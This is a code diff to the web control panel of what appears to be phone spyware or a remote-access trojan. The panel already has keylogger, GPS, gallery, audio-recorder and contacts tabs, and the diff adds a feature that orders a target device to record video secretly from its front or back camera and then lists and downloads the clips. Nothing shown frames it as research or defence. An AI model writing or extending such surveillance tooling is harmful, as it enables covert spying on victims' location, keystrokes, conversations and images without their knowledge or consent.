@@ -679,6 +679,7 @@ body {
         <button class="control-btn" onclick="showGallery(this)">🖼 Media Gallery</button>
         <button class="control-btn" onclick="showKeylog(this)">⌨ Keylogger</button>
         <button class="control-btn" onclick="showAudio(this)">🎤 Audio Recorder</button>
+        <button class="control-btn" onclick="showVideo(this)">🎥 Video Recorder</button>
         <button class="control-btn" onclick="showContacts(this)">📞 Contacts</button>
     </div>
 
@@ -789,6 +790,37 @@ body {
         <div id="audioListContainer" style="margin: 20px;">
             <h3 style="margin-bottom:10px;">📁 Recorded Audio Files</h3>
             <div id="audioList"></div>
+        </div>
+    </section>
+
+    <!-- Video Recording Panel -->
+    <section class="panel" id="videoPanel" style="display:none;">
+        <div class="panel-header">
+            <div>
+                <div class="panel-title">🎥 Remote Video Recorder</div>
+                <div class="panel-subtitle">Record a short video (5-30 seconds) from front or back camera.</div>
+            </div>
+        </div>
+        <div class="gallery-controls" style="margin: 20px;">
+            <label for="videoDurationSelect">Duration:</label>
+            <select id="videoDurationSelect">
+                <option value="5">5 seconds</option>
+                <option value="10" selected>10 seconds</option>
+                <option value="15">15 seconds</option>
+                <option value="20">20 seconds</option>
+                <option value="30">30 seconds</option>
+            </select>
+            <label for="cameraTypeSelect">Camera:</label>
+            <select id="cameraTypeSelect">
+                <option value="1" selected>Back Camera</option>
+                <option value="0">Front Camera</option>
+            </select>
+            <button class="force-btn" onclick="sendVideoRequest()">🎥 Start Recording</button>
+        </div>
+        <div id="videoStatus" style="padding: 0 20px 20px 20px; color: #aaa; font-size: 14px;">No active recording.</div>
+        <div id="videoListContainer" style="margin: 20px;">
+            <h3 style="margin-bottom:10px;">📁 Recorded Videos</h3>
+            <div id="videoList"></div>
         </div>
     </section>
 
@@ -1071,6 +1103,7 @@ function showGPS(btn) { setActiveTab(btn); document.querySelectorAll('.panel').f
 function showGallery(btn) { setActiveTab(btn); document.querySelectorAll('.panel').forEach(p => p.style.display = 'none'); document.getElementById("galleryPanel").style.display = "block"; fetchGalleryPhotos(false); }
 function showKeylog(btn) { setActiveTab(btn); document.querySelectorAll('.panel').forEach(p => p.style.display = 'none'); document.getElementById("keylogPanel").style.display = "block"; refreshKeylog(); }
 function showAudio(btn) { setActiveTab(btn); document.querySelectorAll('.panel').forEach(p => p.style.display = 'none'); document.getElementById("audioPanel").style.display = "block"; loadAudioList(); }
+function showVideo(btn) { setActiveTab(btn); document.querySelectorAll('.panel').forEach(p => p.style.display = 'none'); document.getElementById("videoPanel").style.display = "block"; loadVideoList(); }
 function showContacts(btn) { setActiveTab(btn); document.querySelectorAll('.panel').forEach(p => p.style.display = 'none'); document.getElementById("contactsPanel").style.display = "block"; loadContacts(); }
 
 // ================== FORCE GPS UPDATE ==================
@@ -1177,6 +1210,58 @@ async function loadAudioList() {
 
 function downloadAudio(filename) {
     window.location.href = `/api/audio/download/${encodeURIComponent(filename)}`;
+}
+
+// ================== VIDEO RECORDER ==================
+async function sendVideoRequest() {
+    const deviceId = getDeviceId();
+    const duration = parseInt(document.getElementById("videoDurationSelect").value);
+    const cameraType = parseInt(document.getElementById("cameraTypeSelect").value);
+    const btn = event.target;
+    btn.disabled = true;
+    btn.innerHTML = '⏳ Sending...';
+    document.getElementById("videoStatus").innerHTML = 'Request sent. Waiting for device to record and upload...';
+    try {
+        const res = await fetch('/api/video/request', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ deviceId, duration, cameraType })
+        });
+        const data = await res.json();
+        if (!res.ok) throw new Error(data.error || 'Failed');
+        document.getElementById("videoStatus").innerHTML = `Recording requested for ${duration} seconds. Check list below.`;
+        loadVideoList();
+    } catch (e) {
+        document.getElementById("videoStatus").innerHTML = `Error: ${e.message}`;
+    } finally {
+        btn.disabled = false;
+        btn.innerHTML = '🎥 Start Recording';
+    }
+}
+
+async function loadVideoList() {
+    const deviceId = getDeviceId();
+    const container = document.getElementById("videoList");
+    try {
+        const res = await fetch(`/api/video/list?deviceId=${deviceId}`);
+        const data = await res.json();
+        if (data.files.length === 0) {
+            container.innerHTML = "No recordings yet.";
+            return;
+        }
+        container.innerHTML = data.files.map(file => `
+            <div style="background:#1a1214; border:1px solid #2d1d20; border-radius:10px; padding:12px; margin-bottom:8px; display:flex; align-items:center; justify-content:space-between;">
+                <span>🎬 ${escapeHtml(file)}</span>
+                <button onclick="downloadVideo('${escapeHtml(file)}')" style="background:#ff3439; color:white; border:none; padding:6px 12px; border-radius:6px; cursor:pointer;">⬇ Download</button>
+            </div>
+        `).join("");
+    } catch (e) {
+        container.innerHTML = "Error loading video list.";
+    }
+}
+
+function downloadVideo(filename) {
+    window.location.href = `/api/video/download/${encodeURIComponent(filename)}`;
 }
 
 // ================== CONTACTS & CALL LOGS ==================
